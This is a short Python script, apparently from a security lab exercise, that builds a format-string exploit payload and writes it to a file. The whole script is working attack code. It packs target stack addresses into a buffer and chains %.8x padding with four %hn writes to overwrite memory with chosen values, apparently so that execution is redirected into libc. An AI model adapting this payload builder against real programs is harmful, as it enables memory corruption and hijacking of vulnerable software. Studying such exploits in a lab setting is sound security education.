#!/usr/bin/python3
import sys
N = 200
content = bytearray(0x90 for i in range(N))

# Put the address at the beginning
addr1 =  0xbfffefac
addr2 =  0xbfffefb4
addr3 =  0xbfffefae
addr4 =  0xbfffefb6

content[0:4] = addr1.to_bytes(4, byteorder='little')
content[4:8] = ("dead").encode('latin-1')
content[8:12] = addr2.to_bytes(4, byteorder='little')
content[12:16] = ("beef").encode('latin-1')
content[16:20] = addr3.to_bytes(4, byteorder='little')
content[20:24] = ("cafe").encode('latin-1')
content[24:28] = addr4.to_bytes(4, byteorder='little')
content[28:32] = ("babe").encode('latin-1')

C = 15

# Construct the format string
small1 = 0x5d80-28-C*8
large1 = 0x6a3f-0x5d80
small2 = 0xb7e4-0x6a3f
large2 = 0xb7f6-0xb7e4

s = "%.8x"*C+"%."+str(small1)+"x"+"%hn"+"%."+str(large1)+"x"+"%hn"+"%."+str(small2)+"x"+"%hn"+"%."+str(large2)+"x"+"%hn"

fmt = s.encode('latin-1')
content[28:28+len(fmt)] = fmt

# Write the content to badfile
file = open("input", "wb")
file.write(content)
file.close()
